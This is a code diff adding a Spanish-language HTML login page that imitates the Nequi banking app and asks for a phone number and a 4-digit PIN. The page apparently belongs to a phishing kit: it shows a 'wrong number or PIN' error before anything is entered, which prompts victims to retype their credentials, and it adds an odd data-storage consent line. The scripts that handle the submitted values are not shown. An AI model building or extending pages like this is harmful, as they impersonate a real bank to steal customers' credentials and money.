@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Ingreso</title>
+    <link rel="stylesheet" href="login_final.css">
+    <link rel="stylesheet" href="loading.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <img src="img/logo.png" alt="Nequi" class="logo">
+        </header>
+
+        <main class="main-content">
+            <div id="error-message">
+                Número de celular o clave incorrectos.
+            </div>
+            <p class="description">
+                Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
+            </p>
+
+            <form class="final-login-form">
+                <div class="form-group">
+                    <label for="celular">Número de celular</label>
+                    <input type="tel" id="celular" name="celular" class="input-field" maxlength="10" minlength="10" pattern="[0-9]*" inputmode="numeric">
+                </div>
+
+                <div class="form-group">
+                    <label for="clave">Clave</label>
+                    <input type="password" id="clave" name="clave" class="input-field" maxlength="4" minlength="4" pattern="[0-9]*" inputmode="numeric">
+                </div>
+
+                <div class="consent-box">
+                    <label class="custom-checkbox-container">
+                        <input type="checkbox" id="consent">
+                        <span class="checkmark"></span>
+                        <span class="consent-text">Acepto que las entradas del formulario se comprueben en busca de spam y se almacenen encriptadas durante 14 días.</span>
+                    </label>
+                </div>
+
+                <button type="submit" class="btn btn-entra" disabled>Entra</button>
+                <button type="button" class="btn btn-ahora-no">Ahora No</button>
+            </form>
+
+            <p class="help-text">
+                ¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.
+            </p>
+        </main>
+    </div>
+    <script src="login_final.js"></script>
+    <script src="loading.js"></script>
+</body>
+</html>
